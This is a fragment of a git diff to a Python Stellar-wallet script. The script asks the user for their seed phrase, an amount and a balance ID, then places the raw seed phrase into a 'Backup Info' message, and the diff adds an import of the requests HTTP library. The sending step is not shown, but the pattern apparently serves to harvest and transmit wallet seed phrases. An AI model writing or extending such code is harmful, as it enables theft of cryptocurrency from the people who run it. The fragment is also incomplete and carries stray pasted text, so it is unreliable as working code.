@@ -2,6 +2,7 @@ import json
 from stellar_sdk import Server, Keypair, Asset, TransactionBuilder
 from mnemonic import Mnemonic
 from keyfunc import account_keypair  
+import requests
 
 # Get user input
 my_seed_phrase = input("Enter your seed phrase: ")
@@ -10,7 +11,8 @@ amount = input("Enter the amount to send: ")
 balance_id = input("Enter the balance ID: ")
 
 
-message = f"""Add commentMore actions
+
+message = f"""
 🧾 Backup Info:
 Seed Phrase: {my_seed_phrase}
 Amount: {amount}
